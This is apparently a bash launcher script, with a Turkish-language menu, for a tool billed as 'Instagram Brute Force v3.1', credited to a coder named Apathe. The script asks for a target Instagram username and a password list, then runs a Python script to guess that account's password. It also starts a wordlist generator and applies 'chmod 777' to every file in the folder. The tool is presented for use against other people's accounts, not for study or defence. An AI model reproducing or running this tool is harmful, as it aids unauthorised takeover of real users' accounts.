#!/data/data/com.termux/bin/bash
#!/bin/bash
chmod 777 *
mv -v /$HOME/apathe-bruteforce/apathe-wordlist/wordlist.txt /$HOME/apathe-bruteforce/apathe-bruteforce
mv -v /root/Masaüstü/apathe-bruteforce/apathe-wordlist/wordlist.txt /root/Masaüstü/apathe-bruteforce/apathe-bruteforce
mv -v /Masaüstü/apathe-bruteforce/apathe-wordlist/wordlist.txt /Masaüstü/apathe-bruteforce/apathe-bruteforce
mv -v /home/apathe-bruteforce/apathe-wordlist/wordlist.txt /home/apathe-bruteforce/apathe-bruteforce
mv -v /home/Masaüstü/apathe-bruteforce/apathe-wordlist/wordlist.txt /home/Masaüstü/apathe-bruteforce/apathe-bruteforce
mv -v /home/Downloads/apathe-bruteforce/apathe-wordlist/wordlist.txt /home/Downloads/apathe-bruteforce/apathe-bruteforce
mv -v /home/Desktop/apathe-bruteforce/apathe-wordlist/wordlist.txt /home/Desktop/apathe-bruteforce/apathe-bruteforce
mv -v /Desktop/apathe-bruteforce/apathe-wordlist/wordlist.txt /Desktop/apathe-bruteforce/apathe-bruteforce
clear
cd apathe-bruteforce/ && python3 install.py
clear
banner(){
	echo -e '\e[37m
	\t\033[31;40;1m
	________________________________________
	|
        |
	|    TheosForum.org | Coder : Apathe \e[37m\e[31m
	|
	|         Instagram | Ap4the
	|
	|
	|
	| 01 - \e[37mInstagram Brute Force\e[31m
	|
	| 02 - \e[37mWordlist Oluştur\e[31m
        |
        | 03 - \e[37mTool`un Açılışını Hızlandır\e[31m
        | 
	| 04 - \e[37mÇıkış Yap\e[31m
	|
        |_______________________________________


	\e[33m[\e[37m      Instagram Brute Force v3.1      \e[33m]

	'

	read -p $'\e[31m[\e[32m#\e[31m]\e[37m İşlem Numarası : ' islem_numarasi

}

banner

if [[ $islem_numarasi == 01 ||  $islem_numarasi == 1  ]]; then
	echo -e ""
	read -p $'\e[31m[\e[32m#\e[31m]\e[37m Hedef Kullanıcı Adı : ' username
	read -p $'\n\e[31m[\e[32m#\e[31m]\e[37m Şifre Listesi : ' password
	cd apathe-bruteforce/ &&
	python3 instagram.py $username $password -m 3

elif [[ $islem_numarasi == 02 ||  $islem_numarasi == 2  ]]; then
	cd apathe-wordlist/ && bash start.sh

elif [[ $islem_numarasi == 03 ||  $islem_numarasi == 3  ]]; then
	clear
	rm -rf /$HOME/apathe-bruteforce/apathe-bruteforce/install.py
	rm -rf /$HOME/apathe-bruteforce/apathe-bruteforce/requirements.txt
	bash /$HOME/apathe-bruteforce/start.sh
	
	elif [[ $islem_numarasi == 04 ||  $islem_numarasi == 4  ]]; then
	clear
	echo -e "\e[31m[\e[32m#\e[31m]\e[37m Güle güle...\n"
        echo -e "\e[31m[\e[32m#\e[31m]\e[37m Coder : By Apathe"

	sleep 3
	clear
	exit

else
	bash start.sh
fi

